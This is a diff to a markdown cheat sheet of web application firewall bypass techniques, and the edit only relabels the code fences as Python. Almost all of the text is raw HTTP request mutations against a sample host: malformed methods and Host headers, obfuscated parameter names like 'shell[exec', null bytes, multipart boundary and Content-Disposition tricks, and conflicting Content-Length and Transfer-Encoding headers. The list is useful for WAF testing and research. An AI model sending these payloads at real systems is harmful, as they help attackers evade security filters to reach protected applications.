@@ -5,7 +5,7 @@ Another way to bypass
 
 **Add \r\n before the first line HTTP request**  
 
-```
+```py
 
 GET /login HTTP/1.1
 Host: favoritewaf.com
@@ -14,21 +14,21 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 
 
 **Writing the method with a lowercase (Apache)**
-```
+```py
 get /login HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **Tabs before the method (IIS)**
-```
+```py
     GET /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **GET /login?shell_exec HTTP/1.1**
-```
+```py
 GET /login?shell.exec HTTP/1.1
 GET /login?shell[exec HTTP/1.1
 GET /login?shell%5bexec HTTP/1.1
@@ -38,24 +38,24 @@ GET /login?shell%20exec HTTP/1.1
 ```
 
 **GET /login.php?pam_param=test3**
-```
+```py
 GET /login.php?pam_param=test1&pam[param=test2&pam%5bparam=test3
 ```
 
 **GET /login.php?hello=world HTTP/1.1**
-```
+```py
 GET /login.php?hello%00another_text=world HTTP/1.1
 ```
 
 **HTTP Request - absoluteURI**
-```
+```py
 GET http://localhost/login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **Double host header**
-```
+```py
 GET /login.php HTTP/1.1
 Host: favoritewaf.com
 Host: localhost
@@ -63,20 +63,20 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **Host with lowercase**
-```
+```py
 GET /login.php HTTP/1.1
 host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **Host without space**
-```
+```py
 GET /login.php HTTP/1.1
 Host:favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 **Host with tab**
-```
+```py
 GET /login.php HTTP/1.1
 Host:	favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
@@ -91,20 +91,20 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 \xad (IIS)
 
 Example:
-```
+```py
 GET /login.php HTTP/1.1
 Host: favoritewaf.com:12345
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
-```
+```py
 GET /login.php HTTP/1.1
 Host: favoritewaf.com ignored.text
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ```
 
 **Content-Type with another text** 
-```
+```py
 POST /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
@@ -114,7 +114,7 @@ hello=world
 ```
 
 **HTTP request with incorrect Content-Length (more data than specified)**
-```
+```py
 GET /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
@@ -124,13 +124,13 @@ AAAAAAAA
 ```
 
 **Double Content-Type**
-```
+```py
 Content-Type: multipart/form-data; boundary=ZZZ
 Content-Type: multipart/form-data; boundary=AAA
 ```
 
 **Content-Disposition mutation**
-```
+```py
 GET /login.php HTTP/1.1
 Host: favoritewaf.com
 User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
@@ -146,7 +146,7 @@ world
 ----------1218108630--
 ```
 
-```
+```py
 Content-Disposition: form-data; name="hello"
 Content-Disposition: form-data; name="hello
 Content-Disposition: form-data; name="hello"world"
@@ -154,7 +154,7 @@ Content-Disposition: attachment; name="hello"
 ```
 
 
-```
+```py
 Content-Type: multipart/form-data; boundary=x
 
 
@@ -172,7 +172,7 @@ world
 **Boundary mutation**
 **PHP**
 
-```
+```py
 Content-Type: multipart/form-data; myfavoriteboundaryis=X; boundary=Hello;
 ==
 Content-Type: multipart/form-data; boundary=X;
@@ -180,14 +180,14 @@ Content-Type: multipart/form-data; boundary=X;
 
 
 **Nullbyte**
-```
+```py
 Content-Type: multipart/form-data; boundary=HELLO\x00XXXXXXXXX
 ==
 Content-Type: multipart/form-data; boundary=HELLO
 ```
 
 **Ignored Content-Length**
-```
+```py
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 11
 
@@ -195,7 +195,7 @@ hello=world
 ```
 
 ==
-```
+```py
 Content-Length: 22
 Transfer-Encoding: chunked
 
@@ -206,7 +206,7 @@ hello=world
 ```
 
 ==
-```
+```py
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 Transfer-Encoding: chunked
